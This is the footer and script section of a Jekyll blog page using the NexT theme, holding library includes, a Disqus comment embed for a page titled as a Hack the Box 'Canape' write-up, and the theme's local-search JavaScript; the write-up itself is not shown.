    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fasetto</span>
</div>


<div class="powered-by">
  Powered by <a class="theme-link" href="https://jekyllrb.com">Jekyll</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/simpleyyt/jekyll-theme-next">
    NexT.Mist
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>





















  
   
  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/jquery/index.js?v=2.1.3"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/assets/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/assets/js/src/motion.js?v=5.1.1"></script>



  
  

  <script type="text/javascript" src="/assets/js/src/scrollspy.js?v=5.1.1"></script>
<script type="text/javascript" src="/assets/js/src/post-details.js?v=5.1.1"></script>


  


  <script type="text/javascript" src="/assets/js/src/bootstrap.js?v=5.1.1"></script>



  


  

    
      <script id="dsq-count-scr" src="https://fasetto-github-io.disqus.com/count.js" async></script>
    

    
      
      <script type="text/javascript">
          var disqus_config = function () {
              this.page.url = 'http://fasetto.github.io/hack-the-box-canape/';
              this.page.identifier = '/hack-the-box-canape/';
              this.page.title = '{Hack the Box} \\ Canape Write-Up';
          };
          var d = document, s = d.createElement('script');
          s.src = 'https://fasetto-github-io.disqus.com/embed.js';
          s.setAttribute('data-timestamp', '' + +new Date());
          (d.head || d.body).appendChild(s);
      </script>
      
    

  




	





  











  




  





  


  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
  


  

  

  

</body>
</html>
